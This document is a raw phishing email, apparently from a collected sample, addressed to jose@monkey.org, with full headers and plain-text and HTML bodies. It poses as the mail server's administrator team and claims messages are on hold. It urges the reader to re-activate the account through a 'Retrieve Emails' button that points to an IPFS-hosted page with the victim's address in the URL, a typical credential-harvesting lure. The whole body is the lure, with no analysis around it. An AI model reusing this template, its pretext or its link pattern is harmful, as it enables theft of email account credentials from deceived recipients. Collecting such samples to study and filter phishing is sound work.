@@ -1,0 +1,225 @@
+From jose@monkey.org Fri Feb 17 07:17:11 2023 +0000
+Return-Path: tara@linsange.com
+Delivered-To: jose@monkey.org
+X-FDA: 80475927462.39.28EA9D8
+Received: from xbogzkhy.linsange.com (xbogzkhy.linsange.com [92.52.217.86])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id B604818EACCFF
+	for <jose@monkey.org>; Fri, 17 Feb 2023 07:17:10 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=linsange.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=tara@linsange.com;
+ bh=x3SB9NFIjYWwE24NqeiJxJfcRjs=;
+ b=WP3z0TcX1ZN4C1tMzTeVp8LEF+6U5TNOlfIbDhnm5ndvZm8meaoZcRMpZmMU+PobZ2e2WJQGPEKZ
+   HWXzWU/xDoxgR9UNS+pjRWaS+5b8a6m9QOLXUdyGwb+683PENx6SuHdqjD9ifiBSxvjej0r7VEGe
+   l5TKKoR9SEyzm6ik0jw4pgNQqP2g//bu6xLaKmkKx4czWoosuTbJBoqXHc5LDS5yloTCHJhxoBOE
+   KL9BpzWf2kGad08tNFeDbs1BYn3YmmykU+BskrK8Yz6dc2VbqLJdvU8GS+6YIvo6BnyZxCOgcN2t
+   pDUgaXVxYDhybgF1WzUqUuvNkL0GKkUssdj3Zw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=linsange.com;
+ b=L2Lqd0eXu4hNV4k7nus/OZaGcobgKfa8h3IC78ykKOvZWYu1NGz62sFdRDlSM9qmcpIQEd4FgCRV
+   5Dvsbwj/jPnb/yt9VNtGcPuXKUsXIddc/ahubhhBW2j55s1ZjXL4VpqdeFYXDeB3y5FF9UR8f5Ke
+   3YPT4npzWTgUW+nvYRVU9NXOSH8+/n5MkScEJz8bA7TBLrxB6Q2eFVFgjrArE6XbIy6PSQOo1sSs
+   fbg6QENQs0ly22GYxk3Y2DBL4lpGFL+AsSzQ0nQniXTXY/SJiigedyvumG2iRooW+nBdpbmPqjYk
+   mV1mK/LpSFWJMcCM0YGi34hMdK/9HhJek6WMqQ==;
+From: monkey.org <tara@linsange.com>
+To: jose@monkey.org
+Subject: Suspended incoming messages in  jose@monkey.org server
+Date: 16 Feb 2023 23:17:09 -0800
+Message-ID: <20230216231709.1D0E74CACBBC5343@linsange.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_E33E380C.D8E2BFE5"
+ARC-Authentication-Results: i=1;
+	imf10.b.hostedemail.com;
+	dkim=pass header.d=linsange.com header.s=dkim header.b=WP3z0TcX;
+	dmarc=pass (policy=none) header.from=linsange.com;
+	spf=pass (imf10.b.hostedemail.com: domain of tara@linsange.com designates 92.52.217.86 as permitted sender) smtp.mailfrom=tara@linsange.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1676618230;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Tl0m9YiD62iidcBDOOvS7om0HqHVmdAvPL0M0wAm2bI=;
+	b=LLtxFrxT+bVz2pcMAqfIX7U3Dz0n7h8Z6m3DudXVREtgSzn1sAxjJixG7E5M0MHwDl2kgS
+	PeEvY9i6yFiFn7lbhm1qLePKHI1955hGemqyn8MNLJ9cyAzZyWgOYhZaMJauR9SvPW8hn1
+	lO27yxsKPqYfd/PVutlLTEcCZGp8aUQ=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1676618230; a=rsa-sha256;
+	cv=none;
+	b=jKgC15oFHmJK9EpuWp4ejHnAeJgBssPwh4AKAPrd879jor5hSYpyp/W16y2D/dgPBsslzX
+	rKTgOOCH/I2rEmF4RKbaBNi3Mp5JlTaBgBb7U8OfmnZw3oHmi05oFQPMkx2mqxukAbwETO
+	plkoB5QC5pqxhEH3rph495N6XiIzrus=
+X-Rspamd-Server: rspam06
+X-Rspam-User: 
+Authentication-Results: imf10.b.hostedemail.com;
+	dkim=pass header.d=linsange.com header.s=dkim header.b=WP3z0TcX;
+	dmarc=pass (policy=none) header.from=linsange.com;
+	spf=pass (imf10.b.hostedemail.com: domain of tara@linsange.com designates 92.52.217.86 as permitted sender) smtp.mailfrom=tara@linsange.com
+X-Spam-Status: Yes, score=10.50
+X-Rspamd-Queue-Id: B604818EACCFF
+X-Stat-Signature: ebfhoc3h6kfjugto655run5dykdc5i9i
+X-HE-Tag: 1676618230-827276
+X-HE-Meta: U2FsdGVkX1+t3t+cKuavKgUWozhhEdpVx//cQ+ddZEJU2nAYokE3p60NBpuHPcjmbPhTWwUvYrvpFq8j+Q6NQZO1L/zeq8n9+zYR1qQG5n8Yyal9xNkbqnP9ms/BusuV8C3kZkZh0pzuaMaVFoVwvdCHY0cLQ3pOJ31l2RIZNuLh6OBNZUa2myKglrmxVE1BqR5NKFKSkNC0GAhhMK4U1xTfoG+htDunQdeszgVEOSJ4o8N3qG5GMVylYngXdrxpXe1/aeEgodUkIn0PIfeqbT/Xkyn0u8HGwbXVaHRTVnU3xkbo8Vz79cyHGRKJu5vXRP0ymbFuE8cOOGn1pcIjBnfRqmkDICDtiLUQST1ZCJfHPRF/U11F+KwQRS2Mj3i961XRay4Wfoyqqmc2dHpsCw74AIE1Uui9t/lmBaef/qNpLaD2kPUZky7bz1CRTq6QFocaMuXh148YByZPS1NHVaZvSzswZ/U8mNjNiE6es0/fhs3w3VbFOytLkwyKPVus7OruiX+FSu9haQtVuxCIO2f2WL47LqcEMh5X76Fhh9Zostbo2rTxXyFoOtnPiiT6jvoB9qdHJKWKypsttrHBGFWzlkG5YP/nemgOyghhIhBpthkUTKyVjkJ6nx760L/rJoiyYSRN+qKLY/qxroXa3E13wBbbmxbYuK5My3YkxcTY3/r6hQ/2/ewxaz3JEvUuRJ4+rdA0aLoRabOwaQbXMerz3g1x6Eu2j6wJelP7oq/+QVmcA9nlc7wGtxLfJgqprlE2OEAIEUofje8PAs4ldhKj6Asiv0dRSuXDIlZCwaRiJmDMP4PHzmWKfwQEq7C+TpzPH2ybibY5ae2sE2eTpRIRilzd3gykAYTrOVWgY1phMbLE41NgETJ206iDDiIRaKi3dk5qcDz8/CfMnSh3WoEbQ3Y6HU6HpOKXRx0yAc+rEOgNvyvEOlFe5Q9YMtWXEBAJ3NL5FrvxCbICYXxanIOHSPA
+ Mi1RWTWuLqPUqOd7tjDSeCjp/Lq0H7yfU8g53M90MgQjVPTIBfXQ2t8Eyd6Wg4rggCi2UrWkjgrhjedudPaEvzETt+1qVLqhZud2K7gWa5/OgigMhHjiGE3HDP1k4gcY/YUjf/1hfXIKJvsAbMY6nMGHhiQakCdqPakA5ImGbOxeVM65wtFB+bN4SpQWKUIBl0g1gC1zSYCGybynwDbSroxJJVO3qGx2T465l
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 35
+
+
+------=_NextPart_000_0012_E33E380C.D8E2BFE5
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear jose,
+
+You have some incoming messages that are placed on hold=20
+on=C2=A0jose@monkey.org=C2=A0 Emaii server.
+
+Kindly RE-ACTIVATE your=C2=A0jose@monkey.org=C2=A0account below to=20
+retrievee incoming messages.
+
+This was due to a server issue. Use the button below to rectify.
+=C2=A0
+
+=C2=A0
+ Retrieve Emails
+(=C2=A0
+https://ipfs.io/ipfs/QmWkaqbGgK6hrUcUcqDRdRDSjndMneFwFK14tXK2D1rHgM?filenam=
+e=3DQmWkaqbGgK6hrUcUcqDRdRDSjndMneFwFK14tXK2D1rHgM#jose@monkey.org=C2=A0)
+=C2=A0
+
+
+
+=C2=A0
+=C2=A0
+Administrator Team.
+
+monkey.org=C2=A0Admin. All Rights Reserved 2023.
+------=_NextPart_000_0012_E33E380C.D8E2BFE5
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;"><div class=3D"rcmBody" style=3D"margin: 0.5e=
+m;">
+<p style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sans=
+-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing=
+: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(25=
+5, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -w=
+ebkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-deco=
+ration-style: initial; text-decoration-color:=20
+initial;'>
+<span>Dear jose,<br style=3D"border-radius: 0px;"><br style=3D"border-radiu=
+s: 0px;">You have some incoming messages that are placed on hold on<span>&n=
+bsp;jose@monkey.org</span><span>&nbsp;</span> Emaii server.</span></p>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'>Kindly RE-ACTIVATE your<span>&nbsp;jose@monkey.org</span><span>&n=
+bsp;</span>account below to retrievee incoming messages.<br><br>This was du=
+e to a server issue. Use the button below to rectify.</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'>&nbsp;</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'><br style=3D"border-radius: 0px;">
+<table align=3D"left" style=3D"border-radius: 0px; font-family: inherit; fo=
+nt-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td height=3D"30" align=3D"center" valign=3D"middle" style=3D"margin: 0px; =
+border-radius: 3px; border: 1px solid rgb(232, 180, 99); border-image: none=
+; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;" bgcolor=
+=3D"#ffe86c">
+<table width=3D"100%" style=3D"border-radius: 0px; text-align: left; font-f=
+amily: helvetica, arial, sans-serif; font-stretch: inherit;" bgcolor=3D"tra=
+nsparent" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td width=3D"13" style=3D"margin: 0px; border-radius: 0px; font-family: Rob=
+oto, RobotoDraft, Helvetica, Arial, sans-serif;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"margin: 0px; border-radius: 0px; font-family: Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; border-radius: 0px; font-family: Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif;"><span style=3D"border-width: 0px; margi=
+n: 0px; padding: 0px; border-radius: 0px; color: rgb(0, 0, 0); font-family:=
+ inherit; font-size: 13px; font-weight: bold; vertical-align: baseline; dis=
+play: block; white-space: nowrap; font-stretch: inherit;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-radius:=
+ 0px; font-family: inherit; vertical-align: inherit; font-stretch: inherit;=
+">
+<a style=3D"border-radius: 0px; color: rgb(0, 0, 204);" href=3D"&#10;https:=
+//ipfs.io/ipfs/QmWkaqbGgK6hrUcUcqDRdRDSjndMneFwFK14tXK2D1rHgM?filename=3DQm=
+WkaqbGgK6hrUcUcqDRdRDSjndMneFwFK14tXK2D1rHgM#jose@monkey.org" target=3D"_bl=
+ank" rel=3D"noreferrer"><span>Retrieve Emails</span><br></a></span></span><=
+/td>
+<td width=3D"13" style=3D"margin: 0px; border-radius: 0px; font-family: Rob=
+oto, RobotoDraft, Helvetica, Arial, sans-serif;">
+<table width=3D"13" style=3D"border-radius: 0px; font-family: inherit; font=
+-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"1">
+<tbody style=3D"border-radius: 0px;">
+<tr style=3D"border-radius: 0px;">
+<td style=3D"margin: 0px; border-radius: 0px; font-family: Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td></=
+tr></tbody></table></td></tr></tbody></table><br style=3D"border-radius: 0p=
+x;"><br style=3D"border-radius: 0px;"></div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'>&nbsp;</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'>&nbsp;</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'>Administrator Team.</div>
+<div style=3D'border-radius: 0px; color: rgb(51, 51, 51); text-transform: n=
+one; text-indent: 0px; letter-spacing: normal; font-family: "Noto Sans", sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;'><br style=3D"border-radius: 0px;"><span>monkey.org<span>&nbsp;</s=
+pan>Admin. All Rights Reserved 2023.</span></div></div></body></html>
+------=_NextPart_000_0012_E33E380C.D8E2BFE5--
